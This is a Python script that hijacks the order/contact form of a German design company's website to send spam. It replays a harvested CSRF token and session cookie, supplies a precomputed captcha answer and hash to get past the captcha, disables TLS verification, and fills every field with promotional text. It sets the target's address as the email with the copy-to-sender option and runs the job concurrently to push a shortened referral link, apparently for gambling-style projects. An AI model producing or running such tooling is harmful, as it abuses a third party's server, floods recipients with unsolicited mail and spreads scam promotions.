import requests

import module

url = 'http://functional-design.de/price-list.html'

headers = {
    'Cookie': 'csrf_contao_csrf_token=w8jTc0JRDy2ueoiWWtpH4rgP0mk5vZxKKGg2SApdixU',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
}


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:
        text = self.get_text()
        data = {
            'FORM_SUBMIT': 'auto_form_63',
            'REQUEST_TOKEN': 'w8jTc0JRDy2ueoiWWtpH4rgP0mk5vZxKKGg2SApdixU',
            'name': text,
            'fon': text,
            'email': target,
            'strasse': text,
            'plz': text,
            'stadt': text,
            'lieferstrasse': text,
            'lieferstadt': text,
            'message': text,
            'bestellung_spoiler': text,
            'cc': [
                '',
                'cc',
            ],
            'captcha_851': '14',
            'captcha_851_hash': '729bd9cb8f53b9e333c9b644d78209acf4fffbcfafa7a194e841e8ae2b7a4913',
            'captcha_851_name': '',
        }

        response = requests.post(url, headers=headers, data=data,
                                 verify=False)
        return response


if __name__ == '__main__':
    project_name = 'design'
    s = 'Thank you'

    project = 'allright'  # supercat luckybird allright fortuneclock
    promo_link = 'bit.ly/3iQzonh'
    spam = ConcreteSpam(
        project_name, s,
        referal_project_name=project,
        promo_link=promo_link
    )
    res = spam.send_post()
    if res:
        spam.run_concurrently()
